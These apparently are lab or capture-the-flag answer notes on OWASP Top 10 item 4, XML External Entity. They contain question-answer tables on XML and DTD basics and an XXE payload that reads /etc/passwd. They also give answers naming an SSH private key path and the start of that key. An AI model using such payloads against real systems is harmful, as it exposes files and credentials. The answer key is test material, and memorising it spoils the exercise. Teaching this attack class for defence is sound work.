# OWASP Top 10
# No. 04
# XML External Entity



## XML 

| Questions | Answers |
|-----------|---------|
| Full form of XML | Extensible Markup Language |
| Is it compulsory to have XML prolog in XML documents ? | no |
| Can we valudate XML documents against a schema ? | yes |
| How can we specify XML version and encoding in XML document ? | XML Prolog |


## DTD

| Questions | Answers |
|-----------|---------|
| How do you define a new ELEMENT ? | !ELEMENT |
| How do you define a ROOT element ? | !DOCTYPE |
| How do you define a new ENTITY ? | !ENTITY |


## XXE Payload

for replacing data
```
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
 
```

for reading file 
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>

```


## Exploiting 

| Questions | Answers |
|-----------|---------|
| What is the name of the user in /etc/passwd ? | falcon |
| Where is falcon's SSH key located ? | /home/falcon/.ssh/id_rsa |
| What are the first 18 character for falcon's private key | MIIEogIBAAKCAQEA7b |


